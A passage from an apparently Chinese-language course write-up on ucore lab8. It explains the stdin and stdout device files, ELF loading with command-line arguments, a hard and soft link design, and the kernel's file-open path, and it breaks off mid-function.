<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *devname;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">devnode</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">fs</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> mountable;</span><br><span class="line">    <span class="keyword">list_entry_t</span> vdev_link;</span><br><span class="line">&#125; <span class="keyword">vfs_dev_t</span>;</span><br></pre></td></tr></table></figure>
<p>文件系统通过<code>vfs_dev_t</code>结构的双向链表找到device对应的inode数据结构。一个inode节点在表示设备时成员变量<code>in_type</code>的值是0x1234，则此 inode的成员变量<code>in_info</code>将成为一个device结构，这个inode就是一个设备文件。</p>
<h2 id="stdout设备文件"><a href="#stdout设备文件" class="headerlink" title="stdout设备文件"></a>stdout设备文件</h2><p><strong>初始化</strong></p>
<p>stdout设备初始化如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kern_init--&gt;fs_init--&gt;dev_init--&gt;dev_init_stdout --&gt; dev_create_inode</span><br><span class="line">                                                 --&gt; stdout_device_init</span><br><span class="line">                                                 --&gt; vfs_add_dev</span><br></pre></td></tr></table></figure>
<p>在<code>dev_init_stdout</code>中初始化stdout设备文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">dev_init_stdout(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((node = dev_create_inode()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        panic(<span class="string">&quot;stdout: dev_create_node.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stdout_device_init(vop_info(node, device));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = vfs_add_dev(<span class="string">&quot;stdout&quot;</span>, node, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">&quot;stdout: vfs_add_dev: %e.\n&quot;</span>, ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *</span></span><br><span class="line"><span class="class"><span class="title">dev_create_inode</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((node = alloc_inode(device)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        vop_init(node, &amp;dev_node_ops, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stdout_device_init(struct device *dev) &#123;</span><br><span class="line">    dev-&gt;d_blocks = <span class="number">0</span>;</span><br><span class="line">    dev-&gt;d_blocksize = <span class="number">1</span>;</span><br><span class="line">    dev-&gt;d_open = stdout_open;</span><br><span class="line">    dev-&gt;d_close = stdout_close;</span><br><span class="line">    dev-&gt;d_io = stdout_io;</span><br><span class="line">    dev-&gt;d_ioctl = stdout_ioctl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>访问操作</strong></p>
<p>与一般文件基本操作函数类似，stdout设备文件同样有<code>open</code>、<code>close</code>、<code>read</code>、<code>write</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">stdout_open(struct device *dev, <span class="keyword">uint32_t</span> open_flags) &#123;</span><br><span class="line">    <span class="keyword">if</span> (open_flags != O_WRONLY) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">stdout_close(struct device *dev) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">stdout_ioctl(struct device *dev, <span class="keyword">int</span> op, <span class="keyword">void</span> *data) &#123;</span><br><span class="line">    <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>stdout_open</code>函数在设备打开参数不为只写时报错</p>
<p><code>stdout_io</code>负责完成设备的写操作，具体实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">stdout_io(struct device *dev, struct iobuf *iob, <span class="keyword">bool</span> write) &#123;</span><br><span class="line">    <span class="keyword">if</span> (write) &#123;</span><br><span class="line">        <span class="keyword">char</span> *data = iob-&gt;io_base;</span><br><span class="line">        <span class="keyword">for</span> (; iob-&gt;io_resid != <span class="number">0</span>; iob-&gt;io_resid --) &#123;</span><br><span class="line">            cputchar(*data ++);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写入数据放在<code>iob-&gt;io_base</code>所指的内存区域，写入<code>iob-&gt;io_resid</code>次。每次写操作都是通过<code>cputchar</code>来完成的，通过console外设驱动来完成把数据输出到串口、并口和CGA显示器上。此外，若用户想执行读操作，则<code>stdout_io</code>函数直接返回错误值<code>-E_INVAL</code>。</p>
<h2 id="stdin设备文件"><a href="#stdin设备文件" class="headerlink" title="stdin设备文件"></a>stdin设备文件</h2><p>stdin设备文件实际上就是键盘，为只读设备。</p>
<p><strong>初始化</strong></p>
<p>与stdout设备文件类似，stdin设备文件的初始化主要由<code>stdin_device_init</code> 完成。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stdin_device_init(struct device *dev) &#123;</span><br><span class="line">    dev-&gt;d_blocks = <span class="number">0</span>;</span><br><span class="line">    dev-&gt;d_blocksize = <span class="number">1</span>;</span><br><span class="line">    dev-&gt;d_open = stdin_open;</span><br><span class="line">    dev-&gt;d_close = stdin_close;</span><br><span class="line">    dev-&gt;d_io = stdin_io;</span><br><span class="line">    dev-&gt;d_ioctl = stdin_ioctl;</span><br><span class="line"></span><br><span class="line">    p_rpos = p_wpos = <span class="number">0</span>;</span><br><span class="line">    wait_queue_init(wait_queue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相对于stdout的初始化过程，stdin的初始化相对复杂一些，多了一个stdin_buffer缓冲区，描述缓冲区读写位置的变量p_rpos、p_wpos以及用于等待缓冲区的等待队列wait_queue。在stdin_device_init函数的初始化中，也完成了对p_rpos、p_wpos和wait_queue的初始化。</p>
<p><strong>访问操作</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">stdin_io(struct device *dev, struct iobuf *iob, <span class="keyword">bool</span> write) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!write) &#123;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">if</span> ((ret = dev_stdin_read(iob-&gt;io_base, iob-&gt;io_resid)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            iob-&gt;io_resid -= ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若对该设备文件进行写操作则直接报错返回，若为读操作，则进一步调用<code>dev_stdin_read</code>完成对键盘的读入操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">dev_stdin_read(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (; ret &lt; len; ret ++, p_rpos ++) &#123;</span><br><span class="line">        try_again:</span><br><span class="line">            <span class="keyword">if</span> (p_rpos &lt; p_wpos) &#123;</span><br><span class="line">                *buf ++ = stdin_buffer[p_rpos % STDIN_BUFSIZE];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">wait_t</span> __wait, *wait = &amp;__wait;</span><br><span class="line">                wait_current_set(wait_queue, wait, WT_KBD);</span><br><span class="line">                local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">                schedule();</span><br><span class="line"></span><br><span class="line">                local_intr_save(intr_flag);</span><br><span class="line">                wait_current_del(wait_queue, wait);</span><br><span class="line">                <span class="keyword">if</span> (wait-&gt;wakeup_flags == WT_KBD) &#123;</span><br><span class="line">                    <span class="keyword">goto</span> try_again;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若<code>p_rpos &lt; p_wpos</code>，则表示有键盘输入的新字符在<code>stdin_buffer</code>中，于是就从<code>stdin_buffer</code>中取出新字符放到iobuf指向的缓冲区中；如果<code>p_rpos &gt;=p_wpos</code>，则表明没有新字符，这样调用read用户态库函数的用户进程就需要采用等待队列的睡眠操作进入睡眠状态，等待键盘输入字符的产生。</p>
<p>键盘输入字符后，如何唤醒等待键盘输入的用户进程呢当用户敲击键盘时，会产生键盘中断，在<code>trap_dispatch</code>函数中，当识别出中断是键盘中断（中断号为IRQ_OFFSET + IRQ_KBD）时，会调用<code>dev_stdin_write</code>函数，来把字符写入到<code>stdin_buffer</code>中，且会通过等待队列的唤醒操作唤醒正在等待键盘输入的用户进程。</p>
<h1 id="文件系统的执行程序机制"><a href="#文件系统的执行程序机制" class="headerlink" title="文件系统的执行程序机制"></a>文件系统的执行程序机制</h1><blockquote>
<p>改写proc.c中的load_icode函数和其他相关函数，实现基于文件系统的执行程序机制。执行：make qemu。如果能看看到sh用户程序的执行界面，则基本成功了。如果在sh用户界面上可以执行”ls”,”hello”等其他放置在sfs文件系统中的其他执行程序，则可以认为本实验基本成功。</p>
</blockquote>
<p><code>load_icode</code>分为以下几个步骤：</p>
<ol>
<li>为当前进程建立内存空间</li>
<li>建立页目录表</li>
<li>将文件中各个段加载到内存中，同时设置虚实地址映射</li>
<li>设置用户堆栈并将参数放入到用户堆栈</li>
<li>设置当前进程的cr3,mm</li>
<li>为用户态设置trapframe</li>
</ol>
<p>相比于lab7，lab8中<code>load_icode</code>主要变化如下：</p>
<ul>
<li>ELF文件不再从内存读取，从文件中读入。通过调用<code>load_icode_read</code>函数依次将<code>ELF header</code>，<code>program header</code>以及真正的各个代码段数据段读入内存。</li>
<li>传入参数<code>argc</code>和<code>argv</code>，同时在用户态栈构建命令行参数，使应用程序可以接受命令行参数输入</li>
</ul>
<p>栈空间安排如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">+------------------+  </span><br><span class="line">|   high address   |</span><br><span class="line">+------------------+  </span><br><span class="line">|   argument n     |</span><br><span class="line">+------------------+</span><br><span class="line">|   argument n-<span class="number">1</span>   |</span><br><span class="line">+------------------+</span><br><span class="line">|   argument ...   |</span><br><span class="line">+------------------+  </span><br><span class="line">|   argument <span class="number">1</span>     |</span><br><span class="line">+------------------+  </span><br><span class="line">|   <span class="keyword">null</span> pointer   |</span><br><span class="line">+------------------+ </span><br><span class="line">| pointer to arg n |</span><br><span class="line">+------------------+  </span><br><span class="line">| pointer to arg ..|</span><br><span class="line">+------------------+ </span><br><span class="line">| argument count   |</span><br><span class="line">+------------------+ &lt;- esp(stacktop)</span><br><span class="line">|   low address    |</span><br><span class="line">+------------------+ </span><br></pre></td></tr></table></figure>
<p>将命令行参数放入到栈空间中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">uint32_t</span> len=<span class="number">0</span>,i;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;argc;i++)&#123;</span><br><span class="line">   len+=strnlen(kargv[i],EXEC_MAX_ARG_LEN+<span class="number">1</span>+<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">       <span class="comment">//计算参数内容总长度</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="number">4</span>+<span class="number">1</span>)*<span class="number">4</span>;<span class="comment">//4字节对齐</span></span><br><span class="line">   <span class="comment">//分配参数内容空间的同时分配了空地址所对应的栈空间</span></span><br><span class="line"><span class="keyword">char</span>** uargv=(<span class="keyword">char</span> **)(stacktop  - argc * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">   <span class="comment">//存放指向字符串每行首地址的指针</span></span><br><span class="line">   argv_size = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i ++) &#123;</span><br><span class="line">       uargv[i] = <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(stacktop + argv_size ), kargv[i]);</span><br><span class="line">       argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//存放参数个数</span></span><br><span class="line">   stacktop = (<span class="keyword">uintptr_t</span>)uargv - <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">   *(<span class="keyword">int</span> *)stacktop = argc;</span><br></pre></td></tr></table></figure>
<p>二维数组压栈的时候，最后一个指针后面应该是一个空指针，表示结束，所以在栈空间内分配了4字节空间存储空指针。</p>
<blockquote>
<p>实现基于UNIX硬链接和软链接机制概要设计方案</p>
</blockquote>
<p><strong>硬链接</strong> 在SFS文件系统中已经实现了<code>nlinks</code>数据结构，代表了指向这个<code>inode</code>的硬链接个数，因此只需要添加一个系统调用（例如<code>SYS_link</code>），该系统调用首先找到被链接文件对应的<code>inode</code>，然后在目标文件夹的控制块中增加一个描述符即可，二者的<code>inode</code>指针应该相同，同时<code>nlinks</code>数据结构应该相应增加</p>
<p>创建：</p>
<ol>
<li>将目录项的名字设定为传入参数，目录项的inode号设置为目标文件的inode号。</li>
<li>目标inode的引用计数增加。</li>
</ol>
<p>删除：</p>
<ol>
<li>减少目标inode的引用计数。若减为0，清除目标inode及其数据块。</li>
</ol>
<p><strong>软链接</strong> 软链接的实现稍微复杂些，需要在<code>inode</code>上增加标记位确认这个文件是普通文件还是软链接文件，在进行打开文件或是保存文件的时候，操作系统需要根据软链接指向的地址再次在文件目录中进行查询，寻找或创建相应的<code>inode</code>，注意与硬链接不同，创建软链接的时候不涉及对<code>nlinks</code>的修改。如果需要创建软链接这个特殊的文件，也需要增加一个系统调用（例如<code>SYS_symlink</code>）在完成相应的功能。</p>
<p>创建：将inode的类型设置为符号链接，文件内容（数据）设置为目标路径字符串。</p>
<p>删除：不需要额外的操作。</p>
<h1 id="打开文件流程"><a href="#打开文件流程" class="headerlink" title="打开文件流程"></a>打开文件流程</h1><p>我们接下来分析一个用户进程在打开文件时会做哪些事情？首先假定用户进程需要打开的文件已经存在硬盘上。以<code>user/sfs_filetest1.c</code>为例，首先用户进程会调用在main函数中的如下语句</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> fd1 = safe_open(<span class="string">&quot;/test/testfile&quot;</span>, O_RDWR | O_TRUNC);</span><br></pre></td></tr></table></figure>
<p>若ucore可正常查找到这个文件，那么就会返回一个代表文件的文件描述符。</p>
<p><strong>通用文件访问接口层</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">sysfile_open(<span class="keyword">const</span> <span class="keyword">char</span> *__path, <span class="keyword">uint32_t</span> open_flags) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;path, __path)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = file_open(path, open_flags);</span><br><span class="line">    kfree(path);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先进入通用文件访问接口层，进一步调用如下用户态函数：<code>open-&gt;sys_open-&gt;syscall</code>，通过系统调用进入到内核态。在内核态，通过中断处理例程跳转到<code>sys_open</code>内核函数，并进一步调用sysfile_open内核函数。到了这里，需要把位于用户空间的字符串<code>/test/testfile</code>拷贝到内核空间中的字符串path中，并进入到文件系统抽象层。</p>
<p><strong>文件系统抽象层</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">file_open(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags) &#123;</span><br><span class="line">    <span class="keyword">bool</span> readable = <span class="number">0</span>, writable = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (open_flags &amp; O_ACCMODE) &#123;</span><br><span class="line">    <span class="keyword">case</span> O_RDONLY: readable = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_WRONLY: writable = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_RDWR:</span><br><span class="line">        readable = writable = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = fd_array_alloc(NO_FD, &amp;file)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = vfs_open(path, open_flags, &amp;node)) != <span class="number">0</span>) &#123;</span><br><span class="line">        fd_array_free(file);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file-&gt;pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_APPEND) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> __<span class="title">stat</span>, *<span class="title">stat</span> =</span> &amp;__stat;</span><br><span class="line">        <span class="keyword">if</span> ((ret = vop_fstat(node, stat)) != <span class="number">0</span>) &#123;</span><br><span class="line">            vfs_close(node);</span><br><span class="line">            fd_array_free(file);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        file-&gt;pos = stat-&gt;st_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file-&gt;node = node;</span><br><span class="line">    file-&gt;readable = readable;</span><br><span class="line">    file-&gt;writable = writable;</span><br><span class="line">    fd_array_open(file);</span><br><span class="line">    <span class="keyword">return</span> file-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分配一个空闲的file数据结构变量file</strong></p>
<p>在文件系统抽象层的处理中，首先调用的是<code>file_open</code>函数，为即将打开的文件分配一个file数据结构的变量。从打开文件表中依次找到状态为<code>FD_NONE</code>的file，将file状态改为<code>FD_INIT</code>,最后返回该file对应的文件描述符。此时仅仅是给当前用户进程分配了一个file数据结构的变量，还没有找到对应的文件索引节点。</p>
<p><strong>找到对应索引节点</strong></p>
<p><code>vfs_open</code>函数先通过<code>vfs_lookup</code>找到path对应文件的inode；之后调用<code>vop_open</code>函数打开文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">vfs_open(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags, struct inode **node_store) &#123;</span><br><span class="line">    <span class="keyword">bool</span> can_write = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (open_flags &amp; O_ACCMODE) &#123;</span><br><span class="line">    <span class="keyword">case</span> O_RDONLY:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_WRONLY:</span><br><span class="line">    <span class="keyword">case</span> O_RDWR:</span><br><span class="line">        can_write = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_TRUNC) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!can_write) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> excl = (open_flags &amp; O_EXCL) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> create = (open_flags &amp; O_CREAT) != <span class="number">0</span>;</span><br><span class="line">    ret = vfs_lookup(path, &amp;node);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-16</span> &amp;&amp; (create)) &#123;</span><br><span class="line">            <span class="keyword">char</span> *name;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">dir</span>;</span></span><br><span class="line">            <span class="keyword">if</span> ((ret = vfs_lookup_parent(path, &amp;dir, &amp;name)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = vop_create(dir, name, excl, &amp;node);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (excl &amp;&amp; create) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(node != <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret = vop_open(node, open_flags)) != <span class="number">0</span>) &#123;</span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vop_open_inc(node);</span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_TRUNC || create) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = vop_truncate(node, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            vop_open_dec(node);</span><br><span class="line">            vop_ref_dec(node);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *node_store = node;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>vfs_lookup</code>为针对目录的操作函数。首先调用<code>get_device</code>函数查找文件设备的根目录，并选择开始查找的相对inode。例如，确定<code>C:\Users\abc</code>的文件设备为c盘。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">vfs_lookup(<span class="keyword">char</span> *path, struct inode **node_store) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = get_device(path, &amp;path, &amp;node)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*path != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        ret = vop_lookup(node, path, node_store);</span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    *node_store = node;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据冒号和反斜杠出现的首位置判断，分为以下几种情况</p>
<ul>
<li>冒号不在反斜杠之前，同时反斜杠不在首部或不存在，为相对路径或仅仅只是一个文件名。 以路径为子路径，从当前目录开始查找。</li>
<li>冒号存在于反斜杠之前，为<code>device:path</code>形式，从路径名称中取得根目录。</li>
<li><code>/path</code> 为相对于<code>bootfs</code>的路径，调用<code>vfs_get_bootfs</code> 取得<code>bootfs_node</code>。<code>bootfs_node</code>在<code>init_main</code>函数中设置为disk0。</li>
<li><code>:path</code> 为相对于当前文件系统的路径</li>
</ul>
<p>通过调用<code>vop_lookup</code>函数来查找到根目录下/对应文件<code>sfs_filetest1</code>的索引节点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">get_device(<span class="keyword">char</span> *path, <span class="keyword">char</span> **subpath, struct inode **node_store) &#123;</span><br><span class="line">    <span class="keyword">int</span> i, slash = <span class="number">-1</span>, colon = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; path[i] != <span class="string">&#x27;\0&#x27;</span>; i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (path[i] == <span class="string">&#x27;:&#x27;</span>) &#123; colon = i; <span class="keyword">break</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (path[i] == <span class="string">&#x27;/&#x27;</span>) &#123; slash = i; <span class="keyword">break</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (colon &lt; <span class="number">0</span> &amp;&amp; slash != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* *</span></span><br><span class="line"><span class="comment">         * No colon before a slash, so no device name specified, and the slash isn&#x27;t leading</span></span><br><span class="line"><span class="comment">         * or is also absent, so this is a relative path or just a bare filename. Start from</span></span><br><span class="line"><span class="comment">         * the current directory, and use the whole thing as the subpath.</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        *subpath = path;</span><br><span class="line">        <span class="keyword">return</span> vfs_get_curdir(node_store);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (colon &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* device:path - get root of device&#x27;s filesystem */</span></span><br><span class="line">        path[colon] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* device:/path - skip slash, treat as device:path */</span></span><br><span class="line">        <span class="keyword">while</span> (path[++ colon] == <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        *subpath = path + colon;</span><br><span class="line">        <span class="keyword">return</span> vfs_get_root(path, node_store);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* *</span></span><br><span class="line"><span class="comment">     * we have either /path or :path</span></span><br><span class="line"><span class="comment">     * /path is a path relative to the root of the &quot;boot filesystem&quot;</span></span><br><span class="line"><span class="comment">     * :path is a path relative to the root of the current filesystem</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (*path == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = vfs_get_bootfs(node_store)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(*path == <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = vfs_get_curdir(&amp;node)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* The current directory may not be a device, so it must have a fs. */</span></span><br><span class="line">        assert(node-&gt;in_fs != <span class="literal">NULL</span>);</span><br><span class="line">        *node_store = 